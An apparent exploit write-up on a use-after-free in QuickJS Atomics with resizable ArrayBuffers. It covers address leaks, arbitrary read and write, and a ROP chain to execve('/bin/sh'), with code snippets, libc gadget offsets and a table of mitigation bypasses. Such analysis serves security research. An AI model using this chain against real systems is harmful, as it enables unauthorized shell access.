# QuickJS Atomics Resizable ArrayBuffer UAF Exploit Analysis

## Vulnerability Summary

The vulnerability exists in QuickJS's implementation of Atomics operations when used with resizable ArrayBuffers. A pointer to the buffer's data is captured before user code execution (via `valueOf` callback), but the buffer can be resized during `valueOf`, causing the original pointer to become stale.

### Vulnerable Code Path

In `quickjs.c`, the `js_atomics_op()` function:

1. Captures a pointer to the buffer element via `js_atomics_get_ptr()` (line ~58673)
2. Calls `JS_ToBigInt64Free()` which invokes `valueOf` on the argument (line ~58702)
3. During `valueOf`, the buffer can be resized, freeing the original data
4. The stale pointer is then used for read/write operations (line ~58711)

This results in a use-after-free vulnerability that allows:
- **UAF Read**: Reading from the stale pointer leaks data from the reallocated chunk
- **UAF Write**: Writing to the stale pointer corrupts the reallocated chunk

## Exploitation Strategy

### Target Environment
- Full RELRO: GOT is read-only, cannot overwrite function pointers in GOT
- CFI (Control Flow Integrity): Indirect call targets are validated
- ASLR: All memory regions randomized

### Key Insight

CFI protects indirect calls but **does not protect return addresses**. ROP (Return-Oriented Programming) bypasses CFI by only using `ret` instructions to control execution flow.

### Exploitation Steps

#### Step 1: PIE Leak
When a new ArrayBuffer (victim) is allocated into the freed space, its metadata structure overlaps with where we can read/write. The victim's `free_func` field at offset 48 contains `js_array_buffer_free`, a PIE code pointer.

```javascript
let r1 = uaf(6, 0n);  // Read from offset 48
let pie = r1.old - JS_ARRAY_BUFFER_FREE_OFF;
```

#### Step 2: Libc Leak
Using the arbitrary read primitive, we read from the GOT to leak a libc address:

```javascript
let r2 = uaf(2, pie + FREE_GOT_OFF);
let libc = new BigUint64Array(r2.victim)[0] - LIBC_FREE_OFF;
```

#### Step 3: Stack Leak
We read the `environ` variable from libc to get a stack address:

```javascript
let r3 = uaf(2, libc + LIBC_ENVIRON_OFF);
let environ = new BigUint64Array(r3.victim)[0];
```

#### Step 4: ROP Chain Deployment
Using arbitrary write, we write a ROP chain to a return address on the stack at `environ - 1256`:

```javascript
let r4 = uaf(2, stack_target, 128);
let v4 = new BigUint64Array(r4.victim);

// execve("/bin/sh", NULL, NULL) ROP chain
v4[0] = pop_rdi;      // pop rdi; ret
v4[1] = binsh;        // "/bin/sh" address
v4[2] = pop_rsi;      // pop rsi; ret
v4[3] = 0n;           // argv = NULL
v4[4] = pop_rdx_rbx;  // pop rdx; pop rbx; ret
v4[5] = 0n;           // envp = NULL
v4[6] = 0n;           // rbx = junk
v4[7] = pop_rax;      // pop rax; ret
v4[8] = 59n;          // execve syscall number
v4[9] = syscall_addr; // syscall
```

## Why execve Instead of system()

Initially, I attempted to use `system("/bin/sh")` which seemed to work (system was called with correct arguments). However, `system()` has complex internal behavior:
- Uses `posix_spawn` which requires valid stack space for local variables
- Creates compound literals (argv array) on the stack
- Our ROP chain corrupted the stack space system() needed

Using `execve` syscall directly avoids these issues:
- Minimal stack requirements
- Executes in kernel space
- Doesn't return on success (replaces process image)

## Offset Discovery

The stack offset `environ - 1256` was discovered by:
1. Scanning the stack to find return addresses
2. Testing different offsets to find one that gets used during program execution
3. Verifying with GDB that the ROP chain executes

## Gadgets Used (libc 2.36)

| Gadget | Offset | Purpose |
|--------|--------|---------|
| `pop rdi; ret` | 0x2a145 | Set RDI (first argument) |
| `pop rsi; ret` | 0x2baa9 | Set RSI (second argument) |
| `pop rdx; pop rbx; ret` | 0x8f0c5 | Set RDX (third argument) |
| `pop rax; ret` | 0x43c23 | Set RAX (syscall number) |
| `syscall` | 0x28505 | Execute syscall |

## Protection Bypasses

| Protection | Bypass Method |
|------------|---------------|
| ASLR | Leak PIE via `free_func`, leak libc via GOT, leak stack via environ |
| Full RELRO | ROP instead of GOT overwrite |
| CFI | ROP bypasses CFI (only protects indirect calls, not returns) |
| NX | ROP uses existing code gadgets |

## Conclusion

The UAF vulnerability in QuickJS's Atomics implementation provides powerful arbitrary read/write primitives. Despite Full RELRO and CFI protections, the vulnerability can be exploited via ROP to spawn a shell by:

1. Leaking PIE, libc, and stack addresses
2. Writing a ROP chain to a return address on the stack
3. Using `execve` syscall to spawn `/bin/sh`
